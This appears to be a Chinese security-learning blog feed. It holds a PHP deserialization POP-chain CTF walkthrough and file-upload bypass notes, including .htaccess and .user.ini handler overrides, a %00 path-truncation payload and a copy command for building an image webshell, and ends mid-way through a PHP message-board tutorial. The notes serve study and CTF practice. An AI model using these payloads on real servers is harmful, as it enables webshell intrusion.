href="#POP链构造" class="headerlink" title="POP链构造"></a>POP链构造</h3><p>推荐文章：<a href="https://cjlusec.ldxk.edu.cn/2023/02/15/pop/#POP%E9%93%BE%E4%BB%8B%E7%BB%8D">https://cjlusec.ldxk.edu.cn/2023/02/15/pop/#POP%E9%93%BE%E4%BB%8B%E7%BB%8D</a></p><p>介绍：是一条思路链。</p><blockquote><p>POP 面向属性编程(Property-Oriented Programing) 常用于上层语言构造特定调用链的方法，与二进制利用中的面向返回编程（Return-Oriented Programing）的原理相似，都是从现有运行环境中寻找一系列的代码或者指令调用，然后根据需求构成一组连续的调用链,最终达到攻击者邪恶的目的</p><p>说的再具体一点就是 ROP 是通过栈溢出实现控制指令的执行流程，而我们的反序列化是通过控制对象的属性从而实现控制程序的执行流程，进而达成利用本身无害的代码进行有害操作的目的。</p></blockquote><p>下面着重讲解一题：</p><h4 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">start_gg</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$mod1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$mod2</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;mod1-&gt;<span class="title function_ invoke__">test1</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Call</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$mod1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$mod2</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">test1</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;mod1-&gt;<span class="title function_ invoke__">test2</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">funct</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$mod1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$mod2</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$test2</span>,<span class="variable">$arr</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$s1</span> = <span class="variable language_">$this</span>-&gt;mod1;</span><br><span class="line">        <span class="variable">$s1</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">func</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$mod1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$mod2</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;mod2 = <span class="string">&quot;字符串拼接&quot;</span>.<span class="variable language_">$this</span>-&gt;mod1;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">string1</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$str1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$str2</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;str1-&gt;<span class="title function_ invoke__">get_flag</span>();</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;1&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">GetFlag</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">get_flag</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;flag:&quot;</span>.<span class="string">&quot;xxxxxxxxxxxx&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;string&#x27;</span>];</span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h4 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h4><p>一般采用倒推法：</p><p>找到flag执行处：<code>get_flag()方法</code>，须使string1类的<code>str1 = GetFlag</code>类的对象；</p><p>可是执行$this-&gt;str1-&gt;get_flag();的条件是__toString()魔术方法，须使string1的对象被读取，利用这个：<code>$this-&gt;mod2 = &quot;字符串拼接&quot;.$this-&gt;mod1</code>，使这里的<code>mode2 = string1</code>类的对象；</p><p>可是执行<code>$this-&gt;mod2 = &quot;字符串拼接&quot;.$this-&gt;mod1</code>的条件是 __invoke()，这段代码符合：<code>$s1 = $this-&gt;mod1; $s1();</code> 因为这段代码在funct类中，需要符合<code>__call</code>魔术方法；</p><p>可是执行<code>__call</code>魔术方法的条件是：对不存在的方法或者不可访问的方法进行调用就自动调用。使Call类的mod1 &#x3D; funct类对象。可是test1()方法需要在start_gg类的mod1激活；</p><p>令start_gg类的mod1 &#x3D; Call类的mod1。</p><h4 id="方法"><a href="#方法" class="headerlink" title="方法"></a>方法</h4><p>找到链尾，一步一步溯源直到链头。中间需要满足各种条件，当然一般会有一些暗示。</p>]]></content>
      
      
      <categories>
          
          <category> 反序列化 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 入门 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>文件上传入门</title>
      <link href="/2024/03/18/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%85%A5%E9%97%A8/"/>
      <url>/2024/03/18/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%85%A5%E9%97%A8/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\css\APlayer.min.css"><script src="\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\js\Meting.min.js"></script><h1 id="文件上传入门"><a href="#文件上传入门" class="headerlink" title="文件上传入门"></a>文件上传入门</h1><p>推荐文章：<a href="https://cloud.tencent.com/developer/article/1938541">超详细文件上传漏洞总结分析-腾讯云开发者社区-腾讯云 (tencent.com)</a></p><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>我只能浅显地说：在要上传的文件里构造语句并按照特定的方式进行上传，以达到攻击者的目的。</p><h2 id="限制措施及绕过"><a href="#限制措施及绕过" class="headerlink" title="限制措施及绕过"></a>限制措施及绕过</h2><h3 id="前端检测"><a href="#前端检测" class="headerlink" title="前端检测"></a>前端检测</h3><h4 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h4><p>前端检测主要是通过JavaScript语句。</p><p>附：如果检测失败则不会发出请求，也就是不会发包。</p><h4 id="判断"><a href="#判断" class="headerlink" title="判断"></a>判断</h4><blockquote><p>前端验证通过以后，表单成功提交后会通过浏览器发出─条网络请求，但是如果前端验证不成功，则不会发出这项网络请求;可以在浏览器的网络元素中查看是否发出了网络请求。</p></blockquote><h4 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h4><h5 id="方法一：改变前端"><a href="#方法一：改变前端" class="headerlink" title="方法一：改变前端"></a>方法一：改变前端</h5><p>F12修改source的JavaScript代码，或者直接禁用JavaScript</p><h5 id="方法二：骗过前端"><a href="#方法二：骗过前端" class="headerlink" title="方法二：骗过前端"></a>方法二：骗过前端</h5><p>文件名是name.png，在bp抓包后改成name.php</p><p>须知：只有前端通过后才能发包，bp这时才能抓包</p><h3 id="MIME绕过"><a href="#MIME绕过" class="headerlink" title="MIME绕过"></a>MIME绕过</h3><h4 id="基础"><a href="#基础" class="headerlink" title="基础"></a>基础</h4><h5 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h5><blockquote><p><code>MIME(Multipurpose Internet Mail Extensions)</code>多用途互联网邮件扩展类型。是设定某种扩展名的文件用一种应用程序来打开的方式类型，当该扩展名文件被访问的时候，浏览器会自动使用指定应用程序来打开。</p></blockquote><h5 id="常见的MIME类型"><a href="#常见的MIME类型" class="headerlink" title="常见的MIME类型"></a>常见的MIME类型</h5><blockquote><p><code>text/plain</code> （纯文本）  <code>text/html</code> （HTML文档）  <code>text/javascript</code> （js代码）  <code>application/xhtml+xml</code> （XHTML文档）  <code>image/gif</code> （GIF图像）  <code>image/jpeg</code> （JPEG图像）  <code>image/png</code> （PNG图像）  <code>video/mpeg</code> （MPEG动画）  <code>application/octet-stream</code> （二进制数据）  <code>application/pdf</code> （PDF文档）</p></blockquote><h5 id="检测方式"><a href="#检测方式" class="headerlink" title="检测方式"></a>检测方式</h5><blockquote><p>         在文件上传过程中，服务端会针对我们的上传的文件生成一个数组，这个数组其中有一项就是这个文件的类型<code>file_type</code>；服务端对文件进行检测时，就是通过检测脚本中的黑白名单和这个数组中的<code>file_type</code>进行对比，如果符合要求就允许上传这个文件。</p></blockquote><h4 id="绕过-1"><a href="#绕过-1" class="headerlink" title="绕过"></a>绕过</h4><p>传<code>name.php</code>，bp抓包直接改成<code>image/png</code>等等</p><h3 id="htaccess文件解析漏洞"><a href="#htaccess文件解析漏洞" class="headerlink" title=".htaccess文件解析漏洞"></a><code>.htaccess</code>文件解析漏洞</h3><h4 id="基础-1"><a href="#基础-1" class="headerlink" title="基础"></a>基础</h4><h5 id="原理-2"><a href="#原理-2" class="headerlink" title="原理"></a>原理</h5><blockquote><p><code>.htaccess文件(或者&quot;分布式配置文件&quot;)</code> ,全称是<code>Hypertext Access(超文本入口)</code>。提供了针对目录改变配置的方法，即，在一个特定的文档目录中放置一个包含一个或多个指令的文件，以作用于此目录及其所有子目录。作为用户，所能使用的命令受到限制。管理员可以通过Apache的AllowOverride指令来设置。</p></blockquote><h5 id="前提"><a href="#前提" class="headerlink" title="前提"></a>前提</h5><blockquote><p>web具体应用没有禁止.htaccess文件的上传，同时web服务器提供商允许用户上传自定义的<code>.htaccess文件</code></p></blockquote><h5 id="利用方式"><a href="#利用方式" class="headerlink" title="利用方式"></a>利用方式</h5><blockquote><p>上传覆盖<code>.htaccess文件</code>，重写<code>解析规则</code>，将上传的带有脚本马的图片以脚本方式解析。</p></blockquote><h4 id="绕过-2"><a href="#绕过-2" class="headerlink" title="绕过"></a>绕过</h4><p>第一步：</p><p>先命名成a.htaccess，bp抓包改成<code>.htaccess</code>即可，内容为：</p><p><code>&lt;FilesMatch &quot;js&quot;&gt;</code><br> <code>SetHandler application/x-httpd-php</code><br><code>&lt;/FilesMatch&gt;</code></p><p>再写个木马，改名为name.js</p><p>此时js文件会按照php文件被解析，也就是<code>name.js</code>被当成<code>php</code>文件执行，然后开蚁剑。</p><p>注意点：</p><p>.htaccess是全名，但不能直接在Windows命名，在bp上改</p><p>补录：<a href="https://we11s.github.io/posts/154257042/">https://we11s.github.io/posts/154257042/</a></p><h4 id="htaccess使用模板"><a href="#htaccess使用模板" class="headerlink" title=".htaccess使用模板"></a><code>.htaccess</code>使用模板</h4><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#对于php</span></span><br><span class="line">AddType application/x-httpd-php <span class="string">.html</span>  <span class="comment">#将html文件作为php文件进行解析</span></span><br><span class="line"><span class="comment">#对于python</span></span><br><span class="line">AddHandler cgi-script <span class="string">.py</span> <span class="comment">#将html文件作为php文件进行解析</span></span><br><span class="line">Options +ExecCGI  </span><br><span class="line"><span class="comment">#对于Perl</span></span><br><span class="line">AddHandler cgi-script <span class="string">.cgi</span> <span class="string">.pl</span></span><br><span class="line">Options +ExecCGI</span><br></pre></td></tr></table></figure><h3 id="user-ini文件包含漏洞"><a href="#user-ini文件包含漏洞" class="headerlink" title=".user.ini文件包含漏洞"></a>.user.ini文件包含漏洞</h3><h4 id="基础-2"><a href="#基础-2" class="headerlink" title="基础"></a>基础</h4><blockquote><p>.user.ini实际上就是一个可以由用户“自定义”的php.ini，我们可以自定义除了PHP_INI_SYSTEM以外的模式，在执行php代码之前，系统会对.user.ini先做一个执行，然后才执行其他的php文件。</p><p>我们这边利用.user,ini先执行auto_prepend_file函数，auto_prepend_file表示在php程序加载第一个php代码前加载的php文件，也就是先加载了a.jpg里面的文件，即一句话木马。</p><p>原文链接：<a href="https://blog.csdn.net/hxhxhxhxx/article/details/107165508">https://blog.csdn.net/hxhxhxhxx/article/details/107165508</a></p></blockquote><p>须知：.user.ini配置文件是PHP的，可以在全部环境里生效，而.htaccess配置文件是Apache特有</p><h4 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h4><p>先上传a.user.ini.jpg文件，内容：</p><p><code>GIF89a</code><br><code>//auto_append_file=test1.png</code><br><code>auto_prepend_file=test1.png</code></p><p>第一行绕过文件头检测，第二行可以不写。</p><p>bp抓包改名为<code>.user.ini</code></p><p>再上传<code>test1.png</code>，没必要改名，其内容会被当做PHP文件内容执行。</p><p>这句话：auto_prepend_file表示在php程序加载第一个php代码前加载的php文件</p><p>我们要先找到一个php文件，自己传会被Unicode化，那看看是否有原有的：</p><p><code>url/upload/index.php</code>蚁剑连</p><h3 id="后端检测-文件头检测漏洞"><a href="#后端检测-文件头检测漏洞" class="headerlink" title="后端检测_文件头检测漏洞"></a>后端检测_文件头检测漏洞</h3><h4 id="基础-3"><a href="#基础-3" class="headerlink" title="基础"></a>基础</h4><h5 id="原理-3"><a href="#原理-3" class="headerlink" title="原理"></a>原理</h5><blockquote><p>在每一个文件（包括图片，视频或其他的非ASCII文件）的开头（十六进制表示）实际上都有一片区域来显示这个文件的实际用法，这就是文件头标志。我们可以通过16进制编辑器打开文件，添加服务器允许的文件头以绕过检测。</p></blockquote><h5 id="常见文件头"><a href="#常见文件头" class="headerlink" title="常见文件头"></a>常见文件头</h5><p> GIF：<code>47 49 46 38 39 61</code> png：<code>89 50 4E 47 0D 0A 1A 0A</code> JPG：<code>FF D8 FF E0 00 10 4A 46 49 46</code></p><p>GIF 文件头解码结果：<code>GIF89a</code> PNG 文件头解码结果：<code>\x89PNG\r\n\x1A\n</code> JPG 文件头解码结果：<code>ÿØÿà\x00\x10JFIF</code></p><blockquote><p> 在进行<code>文件头绕过</code>时，我们可以把上面的<code>文件头</code>添加到我们的一句话木马内容最前面，达到绕过文件头检测的目的。</p></blockquote><p>附：最好文件头和代码（木马）之间有个空格</p><h3 id="后端检测-00截断"><a href="#后端检测-00截断" class="headerlink" title="后端检测_00截断"></a>后端检测_00截断</h3><h4 id="基础-4"><a href="#基础-4" class="headerlink" title="基础"></a>基础</h4><blockquote><p>虽然web应用做了校验，但是由于文件上传后的<code>路径用户可以控制</code>，攻击者可以利用手动添加字符串标识符<code>0X00</code>的方式来将后面的拼接的内容<code>进行截断</code>，导致后面的内容无效，而且后面的内容又可以帮助我们绕过黑白名单的检测。</p></blockquote><p>可是0x00跟%00有什么关系呢？</p><p>%00经过URL解码后就是0x00，二者的意思都是空字符，表示一个字符串的结束。我们就可以根据源码利用%00实现.php后缀</p><h4 id="示例：ctfhub"><a href="#示例：ctfhub" class="headerlink" title="示例：ctfhub"></a>示例：ctfhub</h4><h5 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h5><!--if (!empty($_POST['submit'])) {    $name = basename($_FILES['file']['name']);    $info = pathinfo($name);    $ext = $info['extension'];    $whitelist = array("jpg", "png", "gif");    if (in_array($ext, $whitelist)) {        $des = $_GET['road'] . "/" . rand(10, 99) . date("YmdHis") . "." . $ext;        if (move_uploaded_file($_FILES['file']['tmp_name'], $des)) {            echo "<script>alert('上传成功')</script>";        } else {            echo "<script>alert('上传失败')</script>";        }    } else {        echo "文件类型不匹配";    }}--><p>最关键的是这句代码：</p><p><code>$des = $_GET[&#39;road&#39;] . &quot;/&quot; . rand(10, 99) . date(&quot;YmdHis&quot;) . &quot;.&quot; . $ext;</code></p><p>只要在road的值里使用空字符即可，因为GET会编码，所以用%00</p><p>payload：</p><p><code>?road=/var/www/html/upload/test1.php%00</code></p><p>至于下面的文件名，最多判断一下后缀，把后缀补过去也会被%00截断，所以在白名单的范围里里命名即可</p><h3 id="后端检测-后缀名检测漏洞"><a href="#后端检测-后缀名检测漏洞" class="headerlink" title="后端检测_后缀名检测漏洞"></a>后端检测_后缀名检测漏洞</h3><h4 id="原理-4"><a href="#原理-4" class="headerlink" title="原理"></a>原理</h4><blockquote><p>通常是针对文件的扩展名后缀进行检测，主要是通过黑白名单进行过滤检测，如果不符全过滤规则则不允许上传。</p></blockquote><h4 id="黑名单"><a href="#黑名单" class="headerlink" title="黑名单"></a>黑名单</h4><blockquote><p>一般有个专门的 <code>blacklist 文件</code>，里面会包含常见的危险脚本文件。</p></blockquote><h5 id="双写绕过"><a href="#双写绕过" class="headerlink" title="双写绕过"></a>双写绕过</h5><p>有时后端会把敏感字符替换为空，这就可以双写绕过了，比如<code>name.phphpp</code>。</p><h5 id="解析漏洞"><a href="#解析漏洞" class="headerlink" title="解析漏洞"></a>解析漏洞</h5><h6 id="htaccess文件解析漏洞-apache解析漏洞"><a href="#htaccess文件解析漏洞-apache解析漏洞" class="headerlink" title=".htaccess文件解析漏洞- apache解析漏洞"></a><code>.htaccess</code>文件解析漏洞- apache解析漏洞</h6><p>利用.htaccess可以使其他类型的文件按照PHP文件来执行</p><p>apache：<a href="https://zhuanlan.zhihu.com/p/564753382">技术向！Apache解析漏洞 - 知乎 (zhihu.com)</a></p><ol><li>简单来说就是一个配置（AddHandler）：后缀可以是其他的，只要文件名里有<code>.php</code>，就按照PHP文件执行</li><li>使用<code>.php\x0a</code>，具体看上面链接</li></ol><h6 id="IIS7-0-IIS7-5-Nginx的解析漏洞"><a href="#IIS7-0-IIS7-5-Nginx的解析漏洞" class="headerlink" title="IIS7.0 | IIS7.5 | Nginx的解析漏洞"></a>IIS7.0 | IIS7.5 | Nginx的解析漏洞</h6><blockquote><p>Nginx拿到文件路径（更专业的说法是URI）&#x2F;test.jpg&#x2F;test.php后，一看后缀是.php，便认为该文件是php文件，转交给php去处理。php一看&#x2F;test.jpg&#x2F;test.php不存在，便删去最后的&#x2F;test.php，又看&#x2F;test.jpg存在，便把&#x2F;test.jpg当成要执行的文件了，又因为后缀为.jpg，php认为这不是php文件，于是返回Access denied。<br>  这其中涉及到php的一个选项：cgi.fix_pathinfo，该值默认为1，表示开启。开启这一选项PHP可以对文件路径进行修理。<br>  举个例子，当php遇到文件路径&#x2F;1.jpg&#x2F;2.txt&#x2F;3.php时，若&#x2F;1.jpg&#x2F;2.txt&#x2F;3.php不存在，则会去掉最后的&#x2F;3.php，然后判断&#x2F;1.jpg&#x2F;2.txt是否存在，若存在，则把&#x2F;1.jpg&#x2F;2.txt当做文件&#x2F;1.jpg&#x2F;2.txt&#x2F;3.php，若&#x2F;1.jpg&#x2F;2.txt仍不存在，则继续去掉&#x2F;2.txt，以此类推。</p><p>原文链接：<a href="https://blog.csdn.net/weixin_45588247/article/details/118889668">https://blog.csdn.net/weixin_45588247/article/details/118889668</a></p></blockquote><p>简单来说，文件我们可以在存在的文件路径后面加一个虚假的&#x2F;name.php，这个存在的文件如果是一个图片马，就可能实现getshell。</p><h6 id="IIS6-0-IIS5-x解析漏洞解析漏洞"><a href="#IIS6-0-IIS5-x解析漏洞解析漏洞" class="headerlink" title="IIS6.0&#x2F;IIS5.x解析漏洞解析漏洞"></a>IIS6.0&#x2F;IIS5.x解析漏洞解析漏洞</h6><blockquote><ul><li>上传文件名：xxx.asp;.jpg</li></ul><p> 服务器默认不解析;号后面的内容，因此xxx.asp;.jpg被当做asp文件解析</p><ul><li>向xxx.asp目录下面上传xxx.jpg</li></ul><p> 服务器会将xxx.asp目录下的文件都当做asp文件解析</p></blockquote><p><a href="https://blog.csdn.net/song123sh/article/details/123513911">文件上传之IIS6.0解析漏洞_iis6解析漏洞利用-CSDN博客</a></p><p>第一种是文件解析漏洞，如果文件名被修改，可以采用第二种：目录解析漏洞。目录解析漏洞不需要实际的后缀，只需要知道文件名即可</p><h5 id="黑名单的漏网之鱼"><a href="#黑名单的漏网之鱼" class="headerlink" title="黑名单的漏网之鱼"></a>黑名单的漏网之鱼</h5><blockquote><p>比如: <code>asa</code>和<code>cer</code>之类 <code>asp:</code> <code>asa</code> <code>cer</code> <code>aspx</code> <code>jsp:</code> <code>jspx</code> <code>jspf</code> <code>php:</code> <code>php</code> <code>php3</code> <code>php4</code> <code>php5</code> <code>phtml</code> <code>pht</code> <code>exe:</code> <code>exee</code> </p></blockquote><h5 id="利用Windows的命名机制"><a href="#利用Windows的命名机制" class="headerlink" title="利用Windows的命名机制"></a>利用Windows的命名机制</h5><blockquote><p><code>shell.php.</code>  <code>shell.php空格</code>  <code>shell.php:1.jpg</code>  <code>shell. php::$DATA</code>  <code>shell.php:1.jpg</code>  在windows中，后缀名后面的点和空格都会被删除掉。</p></blockquote><h4 id="白名单"><a href="#白名单" class="headerlink" title="白名单"></a>白名单</h4><blockquote><p>一般有个专门的 <code>whitelist 文件</code>，里面会包含的正常文件。</p></blockquote><p>绕过同黑名单</p><h3 id="后端检测-文件头检测漏洞-1"><a href="#后端检测-文件头检测漏洞-1" class="headerlink" title="后端检测_文件头检测漏洞"></a>后端检测_文件头检测漏洞</h3><h5 id="漏洞原理："><a href="#漏洞原理：" class="headerlink" title="漏洞原理："></a>漏洞原理：</h5><blockquote><p>        一般文件内容验证使用<code>getimagesize函数</code>检测,会判断文件是否是一个有效的文件图片,如果是,则允许上传,否则的话不允许上传。  本实验就是将一句话木马插入到一个[合法]的图片文件当中,然后用webshell管理工具进行远程连接。</p></blockquote><p>指令：<code>copy 1.jpg /b + 2.php /a 3.php</code></p><blockquote><p>&#x2F;b:指定以二进制格式复制、合并文件，用于图像或者声音类文件</p><p>&#x2F;a:指定以ascii格式复制、合并文件用于txt等文本类文件</p></blockquote><blockquote><p><strong>这条命令的意思是：通过<code>copy命令</code>，把<code>a.png</code>图片文件，以二进制文件形式添加到<code>a.php</code>文件中，以<code>ASCII文本文件</code>形式输出为<code>3.php</code>文件。</strong></p></blockquote><p>解析图片马需要将图片马被PHP一下，比如文件包含。</p><blockquote><p>    一般解析图片马需要结合<code>解析漏洞</code>或者<code>文件包含</code>才能解析图片马；</p></blockquote><h3 id="条件竞争漏洞"><a href="#条件竞争漏洞" class="headerlink" title="条件竞争漏洞"></a>条件竞争漏洞</h3><p>我简单称之为：卡空子。当文件的判断需要过多的时间时，可以卡那个时间间隔执行木马。</p><blockquote><p>由于服务器并发处理(同时)多个请求，假如<code>a用户</code>上传了木马文件，由于代码执行需要时间，在此过程中<code>b用户</code>访问了<code>a用户</code>上传的文件，会有以下三种情况： </p><p>1.访问时间点在上传成功之前，没有此文件。 </p><p>2.访问时间点在刚上传成功但还没有进行判断，该文件存在。 </p><p>3.访问时间点在判断之后，文件被删除，没有此文件。</p></blockquote><h3 id="二次渲染漏洞"><a href="#二次渲染漏洞" class="headerlink" title="二次渲染漏洞"></a>二次渲染漏洞</h3><h4 id="二次渲染原理："><a href="#二次渲染原理：" class="headerlink" title="二次渲染原理："></a>二次渲染原理：</h4><blockquote><p>                 在我们上传文件后，网站会对图片进行二次处理（格式、尺寸要求等），服务器会把里面的内容进行替换更新，处理完成后，根据我们原有的图片生成一个新的图片并放到网站对应的标签进行显示。</p></blockquote><h4 id="绕过："><a href="#绕过：" class="headerlink" title="绕过："></a>绕过：</h4><blockquote><p>1、配合文件包含漏洞：  将一句话木马插入到网站二次处理后的图片中，也就是把一句话插入图片在二次渲染后会保留的那部分数据里，确保不会在二次处理时删除掉。这样二次渲染后的图片中就存在了一句话，在配合文件包含漏洞获取webshell。  2、可以配合条件竞争：  这里二次渲染的逻辑存在漏洞，先将文件上传，之后再判断，符合就保存，不符合删除，可利用条件竞争来进行爆破上传</p></blockquote><h4 id="如何判断图片是否进行了二次处理？"><a href="#如何判断图片是否进行了二次处理？" class="headerlink" title="如何判断图片是否进行了二次处理？"></a>如何判断图片是否进行了二次处理？</h4><blockquote><p>     对比要与上传后的图片大小，使用<code>16进制编辑器</code>打开图片查看上传后保留了哪些数据，</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 文件上传 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 入门 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PHP message board</title>
      <link href="/2024/03/18/PHP-message-board/"/>
      <url>/2024/03/18/PHP-message-board/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\css\APlayer.min.css"><script src="\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\js\Meting.min.js"></script><h1 id="PHP留言板"><a href="#PHP留言板" class="headerlink" title="PHP留言板"></a>PHP留言板</h1><h2 id="一-数据库启动-bd-php"><a href="#一-数据库启动-bd-php" class="headerlink" title="一.数据库启动(bd.php)"></a>一.数据库启动(bd.php)</h2><h3 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$host</span> = <span class="string">&#x27;localhost&#x27;</span>;</span><br><span class="line"><span class="variable">$username</span> = <span class="string">&#x27;root&#x27;</span>;</span><br><span class="line"><span class="variable">$password</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="variable">$database</span> = <span class="string">&#x27;ROIS_PHP&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$conn</span> = <span class="keyword">new</span> <span class="title function_ invoke__">mysqli</span>(<span class="variable">$host</span>,<span class="variable">$username</span>,<span class="variable">$password</span>,<span class="variable">$database</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$conn</span>-&gt;connect_error) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;Connection failed：&#x27;</span>. <span class="variable">$conn</span>-&gt;connect_error);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="学习"><a href="#学习" class="headerlink" title="学习"></a>学习</h3><p>四个配置没啥说的</p><p>创建$conn对象实现MySQL数据库操作：new mysqli()</p><p>connect_error是$conn的一个属性</p><h2 id="二-注册账户-register-php"><a href="#二-注册账户-register-php" class="headerlink" title="二.注册账户(register.php)"></a>二.注册账户(register.php)</h2><h3 id="代码-1"><a href="#代码-1" class="headerlink" title="代码"></a>代码</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span 